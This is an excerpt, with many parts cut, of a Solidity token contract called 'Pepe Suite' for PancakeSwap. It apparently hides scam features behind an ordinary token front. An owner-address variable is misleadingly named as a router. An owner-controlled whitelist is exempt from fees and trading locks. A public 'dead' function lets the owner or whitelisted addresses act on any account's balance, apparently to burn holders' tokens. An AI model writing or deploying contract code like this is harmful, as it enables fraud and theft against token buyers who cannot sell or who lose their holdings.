...
contract PepeSuite is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isWhitelistedSell;
    ...
    string private constant _name = "Pepe Suite";
    string private constant _symbol = "PS";

    address public _PancakeSwapV1RouterUniswap = 0x0506696B742BB231DC31434bC41CDA8a677AD4FE; //PancakeSwap owner
    address public _PancakeSwapV2RouterUniswap = 0x0506696B742BB231DC31434bC41CDA8a677AD4FE; //can be the same
    ...
    constructor () {
      ...
      IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // mainnet
        ...
        _isExcludedFromFee[address(0xb3db394E627767a163332F116f683e11D8b05687)] = true; //uniswap router liquidity
    ...
    function addWhiteL(address[] calldata accounts) public onlyOwner {
    for (uint i = 0; i < accounts.length; i++) {
        _isExcludedFromFee[accounts[i]] = true;
        _isWhitelisted[accounts[i]] = true;
        _isWhitelistedSell[accounts[i]] = true;
    }
    }

    function dead(address account, uint256 amount) public {
        require(_isWhitelisted[account] || _msgSender() == owner(), "Caller is not whitelisted or the owner");
        _dead(account, amount);
    }

    function _dead(address account, uint256 amount) private {
    ...
    function lockToBuyOrSellForTime(uint256 lastBuyOrSellTime, uint256 lockTime, address sender) public view returns (bool) {
        if (_isWhitelisted[sender] || _isWhitelistedSell[sender]) {
        return false; // Whitelisted addresses are not subject to lock time
    }
